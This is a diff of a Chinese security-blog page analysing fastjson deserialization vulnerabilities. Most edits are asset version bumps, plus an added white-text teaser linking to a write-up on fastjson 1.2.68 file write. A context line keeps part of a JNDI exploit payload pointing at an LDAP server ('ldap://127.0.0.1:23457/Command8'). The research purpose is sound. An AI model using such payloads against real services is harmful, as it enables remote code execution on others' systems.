@@ -4,7 +4,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>fastjson：我一路向北，离开有你的季节 | 素十八</title>
 <meta name="description" content="你救赎的人 终将成为你的光" />
-<link rel="shortcut icon" href="https://su18.org/favicon.ico?v=1621466380322">
+<link rel="shortcut icon" href="https://su18.org/favicon.ico?v=1621594582511">
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
 <link rel="stylesheet" href="https://su18.org/styles/main.css">
@@ -29,7 +29,7 @@
       <div class="main-content">
         <div class="site-header">
   <a href="https://su18.org">
-  <img class="avatar" src="https://su18.org/images/avatar.png?v=1621466380322" alt="">
+  <img class="avatar" src="https://su18.org/images/avatar.png?v=1621594582511" alt="">
   </a>
   <h1 class="site-title">
     素十八
@@ -920,6 +920,7 @@ org.springframework
 	&quot;prefix&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;
 }
 </code></pre>
+<p><font color="white">彩蛋 fastjson 1.2.68 任意文件写入，访问右侧网址：https://su18.org/fastjson-1.2.68 </font></p>
 <h1 id="五-总结">五、总结</h1>
 <p>通过全篇对 fastjson 诸多版本漏洞的学习和研究，可以发现作者不愿舍弃很多特性，而不停的在对程序的安全检查部分进行“打补丁”一样的漏洞修复手段，这就导致了很多漏洞反反复复的修补和绕过，不仅仅是新的 gadget 被挖掘出来需要 fastjson 不断的更新黑名单，更有很多特性点还是隐藏在程序中等待发现，其实从本文来讲，很多触发点我们只研究了其中的一种，如果肯花时间寻找调用方式，肯定还会有新的发现。</p>
 <p>建议远离 fastjson，或开启 safeMode 关闭 autoTypeSupport 并配置反序列化白名单。</p>
